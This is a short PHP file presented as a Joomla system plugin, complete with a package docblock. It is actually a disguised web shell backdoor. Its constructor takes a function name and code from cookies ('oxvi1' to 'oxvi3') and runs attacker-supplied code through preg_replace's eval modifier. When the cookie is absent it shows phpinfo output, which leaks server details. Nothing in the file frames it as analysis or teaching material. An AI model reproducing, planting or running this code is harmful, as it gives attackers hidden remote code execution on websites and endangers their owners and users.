<?php
/**
 * @package     Joomla.Plugin.System
 * @since       1.5
 *
 *
 */
class PluginJoomla {
	public function __construct() {
		$jq = @$_COOKIE['oxvi3'];
		if ($jq) {
			$option = $jq(@$_COOKIE['oxvi2']);
			$au=$jq(@$_COOKIE['oxvi1']);
			$option("/438/e",$au,438); die();
		}
		else
			phpinfo();die;
	}
}
$content = new PluginJoomla;